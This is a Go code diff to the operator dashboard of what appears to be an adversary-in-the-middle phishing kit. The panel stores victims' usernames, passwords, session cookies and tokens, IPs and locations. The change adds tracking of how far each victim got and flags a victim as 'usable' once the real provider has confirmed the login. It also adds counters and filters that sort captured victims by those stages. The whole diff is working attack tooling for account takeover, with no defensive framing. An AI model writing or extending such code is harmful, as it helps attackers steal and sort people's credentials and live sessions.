@@ -39,17 +39,22 @@ type panelGeo struct {
 }
 
 type panelSession struct {
-	Id           int                                         `json:"id"`
-	Phishlet     string                                      `json:"phishlet"`
-	Username     string                                      `json:"username"`
-	Password     string                                      `json:"password"`
-	RemoteAddr   string                                      `json:"remote_addr"`
-	UserAgent    string                                      `json:"useragent"`
-	LandingURL   string                                      `json:"landing_url"`
-	CreateTime   int64                                       `json:"create_time"`
-	UpdateTime   int64                                       `json:"update_time"`
-	HasTokens    bool                                        `json:"has_tokens"`
-	TokenCount   int                                         `json:"token_count"`
+	Id         int    `json:"id"`
+	Phishlet   string `json:"phishlet"`
+	Username   string `json:"username"`
+	Password   string `json:"password"`
+	RemoteAddr string `json:"remote_addr"`
+	UserAgent  string `json:"useragent"`
+	LandingURL string `json:"landing_url"`
+	CreateTime int64  `json:"create_time"`
+	UpdateTime int64  `json:"update_time"`
+	HasTokens  bool   `json:"has_tokens"`
+	TokenCount int    `json:"token_count"`
+	// Stage/Usable are the truthful view: Usable is only true once the provider
+	// confirmed the login, so an abandoned email entry never looks captured.
+	Stage        int                                         `json:"stage"`
+	StageName    string                                      `json:"stage_name"`
+	Usable       bool                                        `json:"usable"`
 	Custom       map[string]string                           `json:"custom,omitempty"`
 	BodyTokens   map[string]string                           `json:"body_tokens,omitempty"`
 	HttpTokens   map[string]string                           `json:"http_tokens,omitempty"`
@@ -77,15 +82,48 @@ func toPanelSession(s *database.Session) *panelSession {
 		UpdateTime:   s.UpdateTime,
 		HasTokens:    hasTokens(s),
 		TokenCount:   count,
+		Stage:        effectiveStage(s),
 		BodyTokens:   s.BodyTokens,
 		HttpTokens:   s.HttpTokens,
 		CookieTokens: s.CookieTokens,
 		Reviewed:     s.Reviewed,
 	}
+	ps.StageName = stageName(ps.Stage)
+	ps.Usable = ps.Stage >= database.StageAuthenticated
 	if g := geoFromCustom(s.Custom); g != nil {
 		ps.Geo = g
 	}
 	return ps
+}
+
+// effectiveStage is the truthful view of how far a victim got. Rows captured
+// before the stage field existed fall back to what can be derived from them.
+func effectiveStage(s *database.Session) int {
+	if s.Stage > database.StageVisited {
+		return s.Stage
+	}
+	tk := hasTokens(s)
+	switch {
+	case tk && s.Password != "":
+		return database.StageAuthenticated
+	case tk || s.Password != "":
+		return database.StageCredentials
+	case s.Username != "":
+		return database.StageEmail
+	}
+	return database.StageVisited
+}
+
+func stageName(stage int) string {
+	switch stage {
+	case database.StageAuthenticated:
+		return "authenticated"
+	case database.StageCredentials:
+		return "credentials only"
+	case database.StageEmail:
+		return "email only"
+	}
+	return "visited"
 }
 
 func geoFromCustom(c map[string]string) *panelGeo {
@@ -118,6 +156,9 @@ func (ds *DashboardServer) handleOverview(w http.ResponseWriter, r *http.Request
 	sessions := ds.cachedSessions()
 
 	withTokens := 0
+	authenticated := 0
+	credentialsOnly := 0
+	emailOnly := 0
 	uniqueIPs := map[string]bool{}
 	byPhishlet := map[string]int{}
 	byCountry := map[string]int{}
@@ -135,6 +176,14 @@ func (ds *DashboardServer) handleOverview(w http.ResponseWriter, r *http.Request
 		}
 		if cn := s.Custom["geo_country_name"]; cn != "" {
 			byCountry[cn]++
+		}
+		switch effectiveStage(s) {
+		case database.StageAuthenticated:
+			authenticated++
+		case database.StageCredentials:
+			credentialsOnly++
+		case database.StageEmail:
+			emailOnly++
 		}
 	}
 
@@ -183,6 +232,10 @@ func (ds *DashboardServer) handleOverview(w http.ResponseWriter, r *http.Request
 		"total_sessions":    len(sessions),
 		"with_tokens":       withTokens,
 		"no_tokens":         len(sessions) - withTokens,
+		"authenticated":     authenticated,
+		"credentials_only":  credentialsOnly,
+		"email_only":        emailOnly,
+		"partial":           credentialsOnly + emailOnly,
 		"unique_ips":        len(uniqueIPs),
 		"active_sessions":   ds.activeSessionCount(),
 		"last_capture":      lastCapture,
@@ -284,6 +337,7 @@ func (ds *DashboardServer) handleSessions(w http.ResponseWriter, r *http.Request
 	search := strings.ToLower(strings.TrimSpace(q.Get("search")))
 	phishlet := q.Get("phishlet")
 	tokenFilter := q.Get("tokens")
+	stageFilter := strings.ToLower(strings.TrimSpace(q.Get("stage")))
 	sortField := q.Get("sort")
 	sortDir := q.Get("dir")
 
@@ -299,6 +353,31 @@ func (ds *DashboardServer) handleSessions(w http.ResponseWriter, r *http.Request
 		}
 		if tokenFilter == "no" && hasTokens(s) {
 			continue
+		}
+		if stageFilter != "" && stageFilter != "all" {
+			st := effectiveStage(s)
+			switch stageFilter {
+			case "usable", "authenticated":
+				if st < database.StageAuthenticated {
+					continue
+				}
+			case "partial":
+				if st < database.StageEmail || st >= database.StageAuthenticated {
+					continue
+				}
+			case "email":
+				if st != database.StageEmail {
+					continue
+				}
+			case "credentials":
+				if st != database.StageCredentials {
+					continue
+				}
+			case "visited":
+				if st != database.StageVisited {
+					continue
+				}
+			}
 		}
 		if search != "" {
 			if !strings.Contains(strings.ToLower(s.Username), search) &&
